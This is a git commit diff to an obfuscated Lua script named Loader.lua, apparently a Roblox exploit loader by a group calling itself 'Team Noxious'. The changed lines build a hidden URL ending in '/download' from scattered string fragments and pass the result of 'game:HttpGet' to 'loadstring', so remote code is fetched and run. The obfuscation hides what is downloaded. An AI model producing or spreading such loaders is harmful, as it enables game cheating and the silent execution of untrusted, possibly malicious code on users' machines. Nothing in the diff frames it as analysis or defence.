c65ca99260f09378383f0db2947a5ecec8b78371
Team Noxious <teamnoxiousholder@gmail.com>
2026-05-22 19:17:31 -0400

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -29,7 +29,7 @@
    .."76c380631"             ..(19==91                      and"a"or"")..
    [[de46e2914]]             .."90ad1b"                     ..[[60da5c3]]
    ..'e04f2acce'             .."c681776"                    ;local F,H=[[
-   0542da4bc]]..             [[ad99edd]],                   "download"F=F
+   0542d73a4bc]]             ,"/download"                   F="97$39:7(:"
       local lsg=             loadstring;Z                   =[[aint2]]
           do lsg             (game:HttpGet                  ([[ad=
               ]]             ~=12 and WOD..                 H)
